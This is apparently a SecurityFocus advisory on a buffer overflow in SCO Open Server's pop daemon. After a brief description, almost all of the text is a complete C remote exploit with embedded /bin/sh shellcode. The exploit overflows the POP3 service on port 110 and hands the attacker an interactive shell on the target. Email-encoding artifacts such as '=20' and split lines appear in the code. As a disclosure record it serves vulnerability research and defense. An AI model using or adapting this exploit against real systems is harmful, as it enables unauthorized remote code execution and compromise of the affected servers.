source: http://www.securityfocus.com/bid/156/info


A buffer overflow exists in the pop server shipped with Santa Cruz Operation, Inc's (SCO) Open Server. By presenting a buffer of sufficient length to the pop server, an attacker can overwrite the return address on the stack, and execute arbitrary code upon a return. SCO's pop server is based on Qualcomm's pop daemon, and this vulnerability is similar to others present in Qualcomm's server.

/*
 *        Remote pop exploit for SCO systems.
 *        by glitch of litecrew.
 *        Ripped  from Miroslaw Grzybek's code.
 */

#include        <stdio.h>
#include        <stdlib.h>
#include        <sys/time.h>
#include        <sys/types.h>
#include        <unistd.h>
#include        <sys/socket.h>
#include        <netinet/in.h>=20
#include        <netdb.h>
#include        <sys/errno.h>

char *shell=
"\xeb\x32\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x12\x89\x5e\x17"
"\x88\x5e\x1c\x8d\x16\x89\x56\x0e\x31\xc0\xb0\x3b\x8d\x7e"
"\x12\x89\xf9\x89\xf9\xbf\x10\x10\x10\x10\x29\x7e\xf5\x89"
"\xcf\xeb\x01\xff\x63\x61\x62\x62\xeb\x1b\xe8\xc9\xff\xff"
"\xff/bin/sh\xaa\xaa\xaa\xaa\xff\xff\xff\xbb\xbb\xbb\xbb"
"\xcc\xcc\xcc\xcc\x9a\xaa\xaa\xaa\xaa\x07\xaa";

#define ADDR 0x80474b4
#define OFFSET 0
#define BUFLEN 1200

char    buf[BUFLEN];
int     offset=OFFSET;
int     nbytes;
int     sock;
struct  sockaddr_in sa;
struct  hostent *hp;
short a;
void main (int argc, char *argv[]) {
        int i;
        if(argc<2) {
                printf("Usage: %s <IP | HOSTNAME> [offset]\n",argv[0]);
                printf("Default offset is 0. It works against SCOPOP =
v2.1.4-R3\n");
                exit(0);
        }
        if(argc>2)
                offset=atoi(argv[2]);
        memset(buf,0x90,BUFLEN);
        memcpy(buf+800,shell,strlen(shell));
        for(i=901;i<BUFLEN-4;i+=4)
                *(int *)&buf[i]=ADDR+offset;
        buf[BUFLEN]='\n';
        if((hp=(struct hostent *)gethostbyname(argv[1]))==NULL) {
                perror("gethostbyname()");
                exit(0);
        }
        if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
                perror("socket()");
                exit(0);
        }
        sa.sin_family=AF_INET;
        sa.sin_port=htons(110);
        memcpy((char *)&sa.sin_addr,(char *)hp->h_addr,hp->h_length);
        if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))!=0) {
                perror("connect()");
                exit(0);
        }
        printf("CONNECTED TO %s... SENDING DATA\n",argv[1]); =
fflush(stdout);
        write(sock,buf,strlen(buf));
        while(1) {
                fd_set input;

                FD_SET(0,&input);
                FD_SET(sock,&input);
                if((select(sock+1,&input,NULL,NULL,NULL))<0) {
                        if(errno==EINTR) continue;
                        printf("CONNECTION CLOSED...\n"); =
fflush(stdout);
                        exit(1);
                }
                if(FD_ISSET(sock,&input)) {
                        nbytes=read(sock,buf,BUFLEN);
                        for(i=0;i<nbytes;i++) {
                             *(char *)&a=buf[i];
                             if ((a!=10)&&((a >126) || (a<32)) ){
                             buf[i]=' ';
                           }
                         }
                        write(1,buf,nbytes);
                }
                if(FD_ISSET(0,&input))
                        write(sock,buf,read(0,buf,BUFLEN));
        }
}
